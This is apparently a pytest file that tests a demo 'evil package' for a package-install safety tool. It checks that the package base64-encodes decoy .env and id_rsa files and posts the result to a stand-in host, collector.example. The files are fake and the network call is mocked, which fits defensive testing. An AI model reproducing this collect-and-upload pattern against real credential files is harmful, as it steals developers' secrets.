import base64
import importlib.util
from pathlib import Path


MODULE_PATH = Path("demo/evil-pkg/evil_pkg/__init__.py").resolve()


def _load_module():
    spec = importlib.util.spec_from_file_location("safeinstall_evil_demo", MODULE_PATH)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_evil_demo_encodes_only_decoy_contents(tmp_path) -> None:
    module = _load_module()
    first = tmp_path / ".env"
    second = tmp_path / "id_rsa"
    first.write_text("SAFEINSTALL_FAKE=true\n", encoding="utf-8")
    second.write_text("FAKE KEY\n", encoding="utf-8")

    payload = module.collect_decoys((first, second))

    assert base64.b64decode(payload) == b"SAFEINSTALL_FAKE=true\n\nFAKE KEY\n"


def test_evil_demo_posts_payload_to_configured_sink(monkeypatch) -> None:
    module = _load_module()
    captured: dict[str, object] = {}

    class FakeResponse:
        def __enter__(self):
            return self

        def __exit__(self, *args: object) -> None:
            return None

    def fake_urlopen(request, timeout: int):
        captured["url"] = request.full_url
        captured["body"] = request.data
        captured["timeout"] = timeout
        return FakeResponse()

    monkeypatch.setattr(module, "urlopen", fake_urlopen)
    module.send_payload(b"encoded-decoy", "http://collector.example/upload")

    assert captured == {
        "url": "http://collector.example/upload",
        "body": b"encoded-decoy",
        "timeout": 5,
    }
